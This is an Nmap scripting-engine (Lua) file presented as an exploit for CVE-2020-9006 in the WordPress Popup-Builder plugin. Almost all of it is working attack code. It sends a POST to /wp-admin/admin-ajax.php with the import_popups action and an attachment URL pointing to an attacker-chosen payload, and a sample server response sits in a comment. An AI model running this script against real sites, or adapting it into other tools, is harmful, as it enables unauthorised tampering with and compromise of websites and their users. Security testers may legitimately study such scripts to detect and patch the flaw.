local http = require 'http'
local shortport = require 'shortport'
local stdnse = require 'stdnse'

description = [[
  CVE-2020-9006: Wordpress Popup-Builder Plugin Exploit

  Args:
    http.useragent  User-Agent string
    payload-url     Payload URL
]]

author = 'Sergey M <yamldeveloper@proton.me>'
license = 'Same as Nmap--See http://nmap.org/book/man-legal.html'
categories = {'vuln'}

portrule = shortport.port_or_service({80, 443}, {'http', 'https'})

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)
  local payload_url = stdnse.get_script_args('payload-url')
  if payload_url == nil then
    return fail('payload-url required')
  end
  stdnse.debug1(('payload_url: %q'):format(payload_url))
  local postdata = {
    action = 'import_popups',
    attachmentUrl = payload_url
  }
  --[[
    HTTP/1.1 400 Bad Request
    Cache-Control: no-cache, must-revalidate, max-age=0
    Connection: keep-alive
    Content-Encoding: gzip
    Content-Type: text/html; charset=UTF-8
    Date: Tue, 21 Jul 2020 16:26:36 GMT
    Expires: Wed, 11 Jan 1984 05:00:00 GMT
    Referrer-Policy: strict-origin-when-cross-origin
    Server: nginx
    Transfer-Encoding: chunked
    Vary: Accept-Encoding
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN
    X-Powered-By: PHP/7.3.15
    X-Robots-Tag: noindex

    0
  ]]
  local response = http.post(host, port, '/wp-admin/admin-ajax.php', nil, nil, postdata)
  if not response or not response.status or response.status ~= 200 or not response.body then
    return fail('request failed')
  end
  return response.body:sub(0, 1024)
end
